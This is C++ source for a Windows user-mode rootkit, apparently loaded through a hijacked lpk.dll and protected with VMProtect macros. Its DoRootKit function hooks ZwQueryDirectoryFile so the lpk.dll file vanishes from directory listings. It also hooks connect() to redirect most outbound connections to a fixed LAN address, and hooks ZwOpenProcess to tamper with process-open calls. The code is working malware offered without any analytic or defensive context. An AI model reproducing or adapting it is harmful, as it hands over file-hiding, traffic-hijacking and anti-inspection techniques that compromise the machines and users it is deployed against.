#include <Windows.h>
#include <WinNT.h> 
#include <stdio.h>
#include <assert.h>
#include "../lpk/detours.h"
#include "../protect/Protect.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status)>=0)  
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 

//字符串类型  
typedef struct _UNICODE_STRING   
{   
	USHORT    Length;   
	USHORT    MaximumLength;   
	PWSTR    Buffer;   
} UNICODE_STRING, *PUNICODE_STRING;   

//参数类型  
typedef struct _IO_STATUS_BLOCK   
{   
	NTSTATUS  Status;   
	ULONG    Information;   
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;   

//枚举类型，主要利用FileBothDirectoryInformation  
typedef enum _FILE_INFORMATION_CLASS {  
	FileDirectoryInformation = 1,  
	FileFullDirectoryInformation,  
	FileBothDirectoryInformation,  
	FileBasicInformation,  
	FileStandardInformation,  
	FileInternalInformation,  
	FileEaInformation,  
	FileAccessInformation,  
	FileNameInformation,  
	FileRenameInformation,  
	FileLinkInformation,  
	FileNamesInformation,  
	FileDispositionInformation,  
	FilePositionInformation,  
	FileFullEaInformation,  
	FileModeInformation,  
	FileAlignmentInformation,  
	FileAllInformation,  
	FileAllocationInformation,  
	FileEndOfFileInformation,  
	FileAlternateNameInformation,  
	FileStreamInformation,  
	FilePipeInformation,  
	FilePipeLocalInformation,  
	FilePipeRemoteInformation,  
	FileMailslotQueryInformation,  
	FileMailslotSetInformation,  
	FileCompressionInformation,  
	FileObjectIdInformation,  
	FileCompletionInformation,  
	FileMoveClusterInformation,  
	FileQuotaInformation,  
	FileReparsePointInformation,  
	FileNetworkOpenInformation,  
	FileAttributeTagInformation,  
	FileTrackingInformation,  
	FileMaximumInformation  
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;  

typedef VOID (NTAPI *PIO_APC_ROUTINE)(  
									  IN PVOID ApcContext,  
									  IN PIO_STATUS_BLOCK IoStatusBlock,  
									  IN ULONG Reserved);  

// typedef struct _FILE_BOTH_DIRECTORY_INFORMATION {   
// 	ULONG NextEntryOffset;  
// 	ULONG Unknown;  
// 	LARGE_INTEGER CreationTime;  
// 	LARGE_INTEGER LastAccessTime;  
// 	LARGE_INTEGER LastWriteTime;  
// 	LARGE_INTEGER ChangeTime;  
// 	LARGE_INTEGER EndOfFile;  
// 	LARGE_INTEGER AllocationSize;  
// 	ULONG FileAttributes;  
// 	ULONG FileNameLength;  
// 	ULONG EaInformationLength;  
// 	UCHAR AlternateNameLength;  
// 	WCHAR AlternateName[12];  
// 	WCHAR FileName[1];  
// } FILE_BOTH_DIRECTORY_INFORMATION,*PFILE_BOTH_DIRECTORY_INFORMATION;  

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	WCHAR         FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;


typedef NTSTATUS (WINAPI *PROOTKIT_ZwQueryDirectoryFile)(
							  _In_      HANDLE FileHandle,
							  _In_opt_  HANDLE Event,
							  _In_opt_  PIO_APC_ROUTINE ApcRoutine,
							  _In_opt_  PVOID ApcContext,
							  _Out_     PIO_STATUS_BLOCK IoStatusBlock,
							  _Out_     PVOID FileInformation,
							  _In_      ULONG Length,
							  _In_      FILE_INFORMATION_CLASS FileInformationClass,
							  _In_      BOOLEAN ReturnSingleEntry,
							  _In_opt_  PUNICODE_STRING FileName,
							  _In_      BOOLEAN RestartScan
							  );
PROOTKIT_ZwQueryDirectoryFile	Old_ZwQueryDirectoryFile;
PROOTKIT_ZwQueryDirectoryFile	Jmp_Old_ZwQueryDirectoryFile;


NTSTATUS WINAPI My_ZwQueryDirectoryFile(
							  _In_      HANDLE FileHandle,
							  _In_opt_  HANDLE Event,
							  _In_opt_  PIO_APC_ROUTINE ApcRoutine,
							  _In_opt_  PVOID ApcContext,
							  _Out_     PIO_STATUS_BLOCK IoStatusBlock,
							  _Out_     PVOID FileInformation,
							  _In_      ULONG Length,
							  _In_      FILE_INFORMATION_CLASS FileInformationClass,
							  _In_      BOOLEAN ReturnSingleEntry,
							  _In_opt_  PUNICODE_STRING FileName,
							  _In_      BOOLEAN RestartScan
							  )
{
	NTSTATUS bRet = Jmp_Old_ZwQueryDirectoryFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,FileInformation,Length,FileInformationClass,ReturnSingleEntry,FileName,RestartScan);
	
	if (!NT_SUCCESS(bRet))  
	{  
		return bRet;  
	}  
	if (FileInformationClass==FileBothDirectoryInformation)  
	{
		PFILE_BOTH_DIR_INFORMATION pFileInfo;  
		PFILE_BOTH_DIR_INFORMATION pLastFileInfo;  
		//测试的C:\\下的virus.exe的隐藏  
		WCHAR VIRUS[] = L"lpk.dll";  
		BOOLEAN flag;  
		pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;   
		pLastFileInfo = NULL;  
		do  
		{  
			flag = !( pFileInfo->NextEntryOffset );  
			WCHAR wFileName[256] = {0};
			memcpy(wFileName,pFileInfo->FileName,pFileInfo->FileNameLength);
			//宽字符比较，暂用WCSSTR  
			if(wcsstr(wFileName,VIRUS)!=NULL)  
			{  
				if(flag)   
				{  
					pLastFileInfo->NextEntryOffset = 0;  
					break;  
				}   
				else  
				{  
					int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformation;  
					int iLeft = (DWORD)Length - iPos - pFileInfo->NextEntryOffset;  
					memcpy( (PVOID)pFileInfo, (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), (DWORD)iLeft );  

#ifdef _DEBUG_LOG_
					OutputDebugStringA("[LOG] hide lpk.dll");
#endif
					continue;  
				}  
			}  
			pLastFileInfo = pFileInfo;  
			pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char *)pFileInfo + pFileInfo->NextEntryOffset);  
		}while(!flag);  

	}  

	return bRet;
}

#define  PIO_APC_ROUTINE	DWORD
typedef NTSTATUS (NTAPI *LPK_ZwDeviceIoControlFile)(
	_In_       HANDLE FileHandle,
	_In_opt_   HANDLE Event,
	_In_opt_   PIO_APC_ROUTINE ApcRoutine,
	_In_opt_   PVOID ApcContext,
	_Out_      PIO_STATUS_BLOCK IoStatusBlock,
	_In_       ULONG IoControlCode,
	_In_opt_   PVOID InputBuffer,
	_In_       ULONG InputBufferLength,
	_Out_opt_  PVOID OutputBuffer,
	_In_       ULONG OutputBufferLength
	);

LPK_ZwDeviceIoControlFile	Old_ZwDeviceIoControlFile;
LPK_ZwDeviceIoControlFile	Jmp_Old_ZwDeviceIoControlFile;

#define AFD_BIND 0x12003

#define AFD_CONNECT 0x12007

#define AFD_SET_CONTEXT 0x12047

#define AFD_RECV 0x12017

#define AFD_SEND 0x1201f

#define AFD_SELECT 0x12024

#define AFD_SENDTO 0x12023 

// ZwFsControlFile
NTSTATUS NTAPI My_ZwDeviceIoControlFile(
										_In_       HANDLE FileHandle,
										_In_opt_   HANDLE Event,
										_In_opt_   PIO_APC_ROUTINE ApcRoutine,
										_In_opt_   PVOID ApcContext,
										_Out_      PIO_STATUS_BLOCK IoStatusBlock,
										_In_       ULONG IoControlCode,
										_In_opt_   PVOID InputBuffer,
										_In_       ULONG InputBufferLength,
										_Out_opt_  PVOID OutputBuffer,
										_In_       ULONG OutputBufferLength
							   )
{

// 	switch (IoControlCode)
// 	{
// 	case 0x00012017:		// recv
// 		{
// 
// 		}
// 		break;
// 	case 0x0001201F:		// send
// 		{
// 			char szPrint[256] = {0};
// 			sprintf_s(szPrint,"[LOG] send socket = 0x%p",FileHandle);
// 			OutputDebugString(szPrint);
// 		}
// 		break;
// 	case 0x00012007 :		// connect
// 	case 0x00012003:
// 		{
// 			sockaddr_in* psockaddr = (sockaddr_in*)((DWORD)InputBuffer+0x0C);
// 
// 			char szPrint[256] = {0};
// 			sprintf_s(szPrint,"[LOG] ip = %s",inet_ntoa(psockaddr->sin_addr));
// 			OutputDebugString(szPrint);
// // 			if( psockaddr->sin_addr.s_addr == inet_addr("192.168.1.1"/*"101.55.120.69"*/) )
// // 			{
// //  				//psockaddr->sin_addr.s_addr = inet_addr("101.55.120.69");
// // 
// // 				
// // 				return -1;
// // 			}
// 		}
// 		break;
// 	case 0x00012023:	// sendto
// 		{
// 			char szPrint[256] = {0};
// 			sprintf_s(szPrint,"[LOG] sendto socket = 0x%p",FileHandle);
// 			OutputDebugString(szPrint);
// 
// 			return STATUS_SUCCESS;
// 		}
// 		break;
// 	default:
// 		{
// 			wchar_t	wszPrint[256] = {0};
// 			swprintf_s(wszPrint,L"[LOG] IoCode = 0x%p\r\n",IoControlCode);
// 			OutputDebugStringW(wszPrint);
// 		}
// 	}

	NTSTATUS status = Jmp_Old_ZwDeviceIoControlFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,IoControlCode,InputBuffer,InputBufferLength,OutputBuffer,OutputBufferLength);

	// GetProcessKernelObject(GetCurrentProcessId());  排除不是传参给驱动创建的EVENT

	return status;
}

typedef int (WINAPI *PCONNECT)(
							   SOCKET s,                          
							   const struct sockaddr FAR *name,  
							   int namelen                        
							   );

PCONNECT	Old_connect;
PCONNECT	Jmp_Old_connect;

// struct sockaddr {
// 	u_short sa_family;              /* address family */
// 	char    sa_data[14];            /* up to 14 bytes of direct address */
// };

int WINAPI CHECKconnect(
						SOCKET s,                          
						const struct sockaddr FAR *name,  
						int namelen                        
						)
{
	sockaddr_in* psockaddr = (sockaddr_in*)name;

#ifdef _DEBUG_LOG_
	char szPrint[256] = {0};
	sprintf_s(szPrint,"[LOG] connect socket = 0x%p ip = %s",s,inet_ntoa(psockaddr->sin_addr));
	OutputDebugStringA(szPrint);
#endif
	
// 	if( psockaddr->sin_addr.S_un.S_un_b.s_b1 == 61 ||
// 		psockaddr->sin_addr.S_un.S_un_b.s_b1 == 58 ||
// 		psockaddr->sin_addr.S_un.S_un_b.s_b1 == 222 ||
// 		psockaddr->sin_addr.S_un.S_un_b.s_b1 == 101)
// 	{
// 		psockaddr->sin_addr.s_addr = inet_addr("192.168.1.108");
// 	}

	if( psockaddr->sin_addr.S_un.S_un_b.s_b1 != 123 &&
		psockaddr->sin_addr.S_un.S_un_b.s_b1 != 111 &&
		psockaddr->sin_addr.S_un.S_un_b.s_b1 != 125 &&
		psockaddr->sin_addr.S_un.S_un_b.s_b1 != 127)
	{
		psockaddr->sin_addr.s_addr = inet_addr("192.168.1.108");
	}


	return Jmp_Old_connect(s,name,namelen);
}


typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (WINAPI *PROOTKIT_ZwOpenProcess)(
						   _Out_     PHANDLE ProcessHandle,
						   _In_      ACCESS_MASK DesiredAccess,
						   _In_      POBJECT_ATTRIBUTES ObjectAttributes,
						   _In_opt_  PCLIENT_ID ClientId
						   );

PROOTKIT_ZwOpenProcess Old_ZwOpenProcess;
PROOTKIT_ZwOpenProcess Jmp_Old_ZwOpenProcess;

NTSTATUS WINAPI My_ZwOpenProcess(
					   _Out_     PHANDLE ProcessHandle,
					   _In_      ACCESS_MASK DesiredAccess,
					   _In_      POBJECT_ATTRIBUTES ObjectAttributes,
					   _In_opt_  PCLIENT_ID ClientId
					   )
{
	if( ClientId->UniqueProcess != 0 )
	{
		ClientId->UniqueProcess = 0;
	}
	return Jmp_Old_ZwOpenProcess(ProcessHandle,DesiredAccess,ObjectAttributes,ClientId);
}

bool DoRootKit()
{
	VMP_BEGIN_EX;
	bool bRet = true;  

	Old_ZwQueryDirectoryFile = (PROOTKIT_ZwQueryDirectoryFile)GetProcAddress(LoadLibraryA("ntdll.dll"),"ZwQueryDirectoryFile");
	assert(Old_ZwQueryDirectoryFile);
	if( Old_ZwQueryDirectoryFile != 0 )
	{
		HOOKEX(Old_ZwQueryDirectoryFile,My_ZwQueryDirectoryFile,Jmp_Old_ZwQueryDirectoryFile);
	}

	Old_ZwDeviceIoControlFile = (LPK_ZwDeviceIoControlFile)GetProcAddress(LoadLibraryA("ntdll.dll"),"ZwDeviceIoControlFile");	// ZwDeviceIoControlFile
	assert(Old_ZwDeviceIoControlFile);
	if( Old_ZwDeviceIoControlFile != 0 )
	{
		HOOKEX(Old_ZwDeviceIoControlFile,My_ZwDeviceIoControlFile,Jmp_Old_ZwDeviceIoControlFile);
	}

	Old_connect	= (PCONNECT)GetProcAddress(LoadLibraryA("Ws2_32.dll"),VMProtectDecryptString("connect"));
	if( Old_connect != NULL )
	{
		HOOKEX(Old_connect,CHECKconnect,Jmp_Old_connect);
	}

	Old_ZwOpenProcess = (PROOTKIT_ZwOpenProcess)GetProcAddress(LoadLibraryA("ntdll.dll"),"ZwOpenProcess");
	assert(Old_ZwOpenProcess);
	if( Old_ZwOpenProcess != 0 )
	{
		HOOKEX(Old_ZwOpenProcess,My_ZwOpenProcess,Jmp_Old_ZwOpenProcess);
	}

	VMP_END;
	return bRet;
}